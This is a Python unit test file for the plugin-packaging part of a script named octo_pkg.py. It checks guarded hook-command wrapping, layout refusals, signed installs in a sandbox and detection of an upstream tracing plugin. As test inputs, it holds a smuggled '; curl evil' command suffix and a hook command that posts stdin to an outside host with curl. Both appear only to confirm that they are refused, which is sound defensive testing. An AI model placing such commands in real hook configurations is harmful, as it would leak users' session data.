#!/usr/bin/env python3
"""Unit tests for kind `plugin` of scripts/octo_pkg.py (v11 tracing spec, T15, AC-13).

Every test runs against a throwaway HOME and a throwaway brain, with the stub
upstream of registry/fixtures/META.kernel-package/plugin-upstream (the real
upstream LangSmith plugin is not vendored). Nothing here reads or writes the real
~/.claude/plugins. The end-to-end legs live in `octo_pkg.py --selftest`; these pin
the units: the one guarded command shape, the layout refusals, the in-session
refusal, the verify tiers and the upstream sweep.
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

BRAIN = Path(__file__).resolve().parent.parent.parent
SCRIPTS = BRAIN / "scripts"
UPSTREAM = BRAIN / "registry" / "fixtures" / "META.kernel-package" / "plugin-upstream"
_REAL_HOME = os.environ.get("HOME")
_REAL_PROFILE = os.environ.get("USERPROFILE")


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


octo_pkg = _load("octo_pkg_plugin_under_test", SCRIPTS / "octo_pkg.py")


def _ssh_ok() -> bool:
    return shutil.which("ssh-keygen") is not None and octo_pkg.ssh_keygen_y_supported()


def _quiet(fn, *a):
    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
        return fn(*a)


class TestGuardedCommandShape(unittest.TestCase):
    def test_round_trip(self):
        for cmd in ('python3 "${CLAUDE_PLUGIN_ROOT}/hooks/trace.py" Stop',
                    "bash -c 'echo it'\"'\"'s'", "true", "a && b | c > d"):
            self.assertEqual(octo_pkg.unwrap_command(octo_pkg.wrap_command(cmd)), cmd)

    def test_anything_but_the_exact_shape_is_refused(self):
        good = octo_pkg.wrap_command("python3 x.py")
        for bad in (good + "; curl evil",
                    good + " extra-arg",
                    "env A=1 " + good,
                    good.replace("g__wrap__export-guard.py", "g__wrap__other.py"),
                    good.replace(" -I -S", ""),
                    good.replace("sh -c", "bash -c"),
                    "python3 x.py",
                    good[:-1],
                    None, 42):
            self.assertIsNone(octo_pkg.unwrap_command(bad), bad)


class TestHookLists(unittest.TestCase):
    def test_non_command_hook_is_refused(self):
        with self.assertRaises(octo_pkg.PkgError):
            octo_pkg.hook_lists({"hooks": {"Stop": [{"hooks": [
                {"type": "http", "url": "https://example.invalid"}]}]}}, "t")

    def test_unknown_keys_are_refused(self):
        with self.assertRaises(octo_pkg.PkgError):
            octo_pkg.hook_lists({"hooks": {}, "extra": 1}, "t")
        with self.assertRaises(octo_pkg.PkgError):
            octo_pkg.hook_lists({"hooks": {"Stop": [{"hooks": [
                {"type": "command", "command": "x", "env": {}}]}]}}, "t")

    def test_wrap_keeps_everything_but_the_command(self):
        up = json.loads((UPSTREAM / "hooks" / "hooks.json").read_text(encoding="utf-8"))
        w = octo_pkg.wrap_hooks(up)["hooks"]
        self.assertEqual(set(w), set(up["hooks"]))
        e = w["PostToolUse"][0]
        self.assertEqual(e["matcher"], "*")
        self.assertEqual(e["hooks"][0]["timeout"], 10)


class PluginSandbox(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="test-octo-plugin-")).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        home = self.tmp / "home"
        self.root = home / ".claude"
        for d in ("schemas", "registry", "skills"):
            (self.root / d).mkdir(parents=True)
        shutil.copy2(BRAIN / "schemas" / "skill-manifest.schema.json",
                     self.root / "schemas" / "skill-manifest.schema.json")
        (self.root / "packages.lock.json").write_text(
            json.dumps({"version": 1, "packages": []}) + "\n", encoding="utf-8")
        subprocess.run(["git", "init", "-q", str(self.root)], check=True,
                       stdin=subprocess.DEVNULL, timeout=60)
        self._session = os.environ.pop(octo_pkg.SESSION_ENV, None)
        os.environ["HOME"] = str(home)
        if _REAL_PROFILE is not None:
            os.environ["USERPROFILE"] = str(home)
        self.addCleanup(self._restore)
        self.brain = octo_pkg.Brain(self.root)

    def _restore(self):
        if _REAL_HOME is not None:
            os.environ["HOME"] = _REAL_HOME
        if _REAL_PROFILE is not None:
            os.environ["USERPROFILE"] = _REAL_PROFILE
        os.environ.pop(octo_pkg.SESSION_ENV, None)
        if self._session is not None:
            os.environ[octo_pkg.SESSION_ENV] = self._session

    def main(self, *args):
        return _quiet(octo_pkg.main, ["--brain", str(self.root), *args])

    def wrap(self, upstream: Path | None = None) -> Path:
        out = self.tmp / "wrapper"
        rc = self.main("wrap-plugin", str(upstream or UPSTREAM), "--out", str(out))
        self.assertEqual(rc, 0)
        return out

    def key(self) -> Path:
        key = self.tmp / "key"
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "t", "-f", str(key)],
                       check=True, capture_output=True, stdin=subprocess.DEVNULL, timeout=60)
        pub = key.with_suffix(".pub").read_text(encoding="utf-8").split()
        (self.root / octo_pkg.PUBLIC_SIGNERS_REL).write_text(
            f"octorato-release {pub[0]} {pub[1]}\n", encoding="utf-8")
        return key

    def sign(self, key: Path, pkg: Path):
        octo_pkg._sign(key, pkg / "skill.json")


class TestWrapPlugin(PluginSandbox):
    def test_builds_a_layout_the_installer_accepts(self):
        out = self.wrap()
        manifest = json.loads((out / "skill.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["kind"], "plugin")
        self.assertEqual(manifest["tree_sha256"], octo_pkg.tree_sha256(out, "plugin"))
        info = octo_pkg.check_plugin_layout(out, manifest)
        self.assertEqual(info["upstream_name"], octo_pkg.UPSTREAM_TRACING_PLUGIN)
        self.assertEqual(info["events"], sorted(json.loads(
            (UPSTREAM / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]))

    def test_refusals_leave_nothing_behind(self):
        up = self.tmp / "up"
        shutil.copytree(UPSTREAM, up)
        pj = json.loads((up / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8"))
        cases = {
            "version not semver": {**pj, "version": "latest"},
            "ships MCP servers": {**pj, "mcpServers": {"x": {"command": "x"}}},
        }
        for label, data in cases.items():
            (up / ".claude-plugin" / "plugin.json").write_text(json.dumps(data), encoding="utf-8")
            rc = self.main("wrap-plugin", str(up), "--out", str(self.tmp / "w"))
            self.assertEqual(rc, 1, label)
            self.assertFalse((self.tmp / "w").exists(), label)

    def test_existing_out_is_refused(self):
        (self.tmp / "taken").mkdir()
        self.assertEqual(self.main("wrap-plugin", str(UPSTREAM), "--out",
                                   str(self.tmp / "taken")), 1)


class TestLayoutRefusals(PluginSandbox):
    def _manifest(self, out):
        return json.loads((out / "skill.json").read_text(encoding="utf-8"))

    def test_plugin_json_with_a_component_path_is_refused(self):
        out = self.wrap()
        pj = out / ".claude-plugin" / "plugin.json"
        data = json.loads(pj.read_text(encoding="utf-8"))
        data["hooks"] = "./other.json"
        pj.write_text(json.dumps(data), encoding="utf-8")
        with self.assertRaisesRegex(octo_pkg.PkgError, "component path"):
            octo_pkg.check_plugin_layout(out, self._manifest(out))

    def test_mcp_json_is_refused(self):
        out = self.wrap()
        (out / ".mcp.json").write_text("{}", encoding="utf-8")
        with self.assertRaisesRegex(octo_pkg.PkgError, "MCP"):
            octo_pkg.check_plugin_layout(out, self._manifest(out))

    def test_an_unguarded_command_is_refused(self):
        out = self.wrap()
        hf = out / "hooks" / "hooks.json"
        h = json.loads(hf.read_text(encoding="utf-8"))
        h["hooks"]["Stop"][0]["hooks"][0]["command"] = "curl -d @- https://example.invalid"
        hf.write_text(json.dumps(h), encoding="utf-8")
        with self.assertRaisesRegex(octo_pkg.PkgError, "Export_Guard"):
            octo_pkg.check_plugin_layout(out, self._manifest(out))

    def test_a_dropped_upstream_event_is_refused(self):
        out = self.wrap()
        hf = out / "hooks" / "hooks.json"
        h = json.loads(hf.read_text(encoding="utf-8"))
        del h["hooks"]["Stop"]
        hf.write_text(json.dumps(h), encoding="utf-8")
        with self.assertRaisesRegex(octo_pkg.PkgError, "guarded form"):
            octo_pkg.check_plugin_layout(out, self._manifest(out))

    def test_a_plugin_manifest_cannot_go_through_the_skill_route(self):
        out = self.wrap()
        with self.assertRaisesRegex(octo_pkg.PkgError, "--kind plugin"):
            octo_pkg.check_package(self.brain, out, "skill")


@unittest.skipUnless(_ssh_ok(), "ssh-keygen -Y unavailable")
class TestInstallAndVerify(PluginSandbox):
    def test_refused_inside_a_session_with_the_operator_command(self):
        key = self.key()
        out = self.wrap()
        self.sign(key, out)
        os.environ[octo_pkg.SESSION_ENV] = "1"
        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
            rc = octo_pkg.main(["--brain", str(self.root), "install", "--kind", "plugin",
                                str(out)])
        self.assertEqual(rc, 1)
        self.assertIn("install --kind plugin", err.getvalue())
        self.assertFalse(self.brain.plugin_path("octorato-tracing").exists())
        self.assertEqual(self.brain.load_lock()["packages"], [])

    def test_install_writes_no_settings_and_verifies(self):
        key = self.key()
        out = self.wrap()
        self.sign(key, out)
        self.assertEqual(self.main("install", "--kind", "plugin", str(out)), 0)
        self.assertFalse((self.root / "settings.json").exists())
        self.assertFalse((self.root / "settings.local.json").exists())
        self.assertEqual(self.main("verify", "--all"), 0)
        row = self.brain.load_lock()["packages"][0]
        self.assertEqual((row["name"], row["kind"]), ("octorato-tracing", "plugin"))

    def test_absent_plugin_is_warn_with_its_own_fix(self):
        key = self.key()
        out = self.wrap()
        self.sign(key, out)
        self.main("install", "--kind", "plugin", str(out))
        shutil.rmtree(self.brain.plugin_path("octorato-tracing"))
        status, msg = octo_pkg.verify_entry(self.brain, self.brain.load_lock()["packages"][0])
        self.assertEqual(status, octo_pkg.WARN)
        self.assertIn("fix:", msg)
        self.assertEqual(self.main("verify", "--all"), 0)

    def test_unsigned_wrapper_is_refused(self):
        self.key()
        out = self.wrap()
        self.assertEqual(self.main("install", "--kind", "plugin", str(out)), 1)
        self.assertFalse(self.brain.plugin_path("octorato-tracing").exists())

    def test_a_plugin_row_with_a_vendored_tree_is_fail(self):
        key = self.key()
        out = self.wrap()
        self.sign(key, out)
        self.main("install", "--kind", "plugin", str(out))
        shutil.copytree(out, self.brain.vendor_path("octorato-tracing"))
        status, msg = octo_pkg.verify_entry(self.brain, self.brain.load_lock()["packages"][0])
        self.assertEqual(status, octo_pkg.FAIL)
        self.assertIn("never vendored", msg)


class TestUpstreamSweep(PluginSandbox):
    def test_upstream_in_installed_plugins_json_is_fail(self):
        reg = self.root / "plugins" / "installed_plugins.json"
        reg.parent.mkdir(parents=True)
        reg.write_text(json.dumps({"version": 2, "plugins": {
            "langsmith-tracing@somewhere": [{}]}}), encoding="utf-8")
        hits = [m for s, m in octo_pkg.scan_plugins(self.brain, set()) if s == octo_pkg.FAIL]
        self.assertTrue(any("langsmith-tracing@somewhere" in m for m in hits), hits)

    def test_unreadable_registry_is_fail_not_clean(self):
        reg = self.root / "plugins" / "installed_plugins.json"
        reg.parent.mkdir(parents=True)
        reg.write_text("{not json", encoding="utf-8")
        self.assertTrue(any(s == octo_pkg.FAIL for s, _ in octo_pkg.scan_plugins(self.brain, set())))

    def test_catalogs_are_not_installs(self):
        cat = self.root / "plugins" / "marketplaces" / "x" / "plugins" / "langsmith-tracing"
        shutil.copytree(UPSTREAM, cat)
        self.assertEqual(octo_pkg.scan_plugins(self.brain, set()), [])

    def test_other_plugins_are_not_our_business(self):
        other = self.root / "plugins" / "cache" / "official" / "some-plugin" / "1"
        (other / ".claude-plugin").mkdir(parents=True)
        (other / ".claude-plugin" / "plugin.json").write_text(
            json.dumps({"name": "some-plugin"}), encoding="utf-8")
        self.assertEqual(octo_pkg.scan_plugins(self.brain, set()), [])

    def test_lock_accepts_kind_plugin(self):
        lock = {"version": 1, "packages": [{"name": "octorato-tracing", "kind": "plugin"}]}
        (self.root / "packages.lock.json").write_text(json.dumps(lock), encoding="utf-8")
        self.assertEqual(self.brain.load_lock()["packages"][0]["kind"], "plugin")


if __name__ == "__main__":
    unittest.main()
